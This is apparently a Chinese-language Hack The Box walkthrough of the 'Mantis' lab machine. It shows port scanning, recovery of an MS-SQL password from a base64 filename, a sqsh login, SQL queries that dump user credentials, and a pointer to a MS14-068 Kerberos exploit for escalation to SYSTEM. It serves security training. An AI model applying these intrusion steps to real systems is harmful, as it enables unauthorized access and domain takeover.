    htb之Mantis

    nmap 收集一下信息

    可以看到1337和8080端口上运行着web服务
    目录爆破一下1337端口

    http://10.10.10.52:1337/secure_notes/
    上面显示着一个由base64编码组成的文件,打开可以看到一些有用的信息


    现在解码一下这个文件名

    不用测试都能看出来这是一个MS-SQL密码,直接连接吧

    sqsh -U admin -S 10.10.10.52

    使用数据库命令枚举一下所需要的信息

    1. SELECT name FROM master.dbo.sysdatabases
    2. go
    3. SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES
    4. go
    5. SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS
    6. go
    7. USE orcharddb
    8. go
    9. SELECT * FROM blog_Orchard_Users_UserPartRecord
    10. go

    最后我们能获取到两个用户的账户密码

    admin:Password1234
    James:J@m3s_P@ssW0rd!

    MS14-068

    该漏洞针对的是kerberos服务，并允许任何用户通过伪造kerberos票证将其普通用户的权限提升为域管理员。这是一个众所周知的漏洞利用，如果您具有较低的特权用户，则始终值得检查是否与过期的域控制器进行交互。

    exp:https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek

    通过漏洞利用，我们能直接获取到system权限
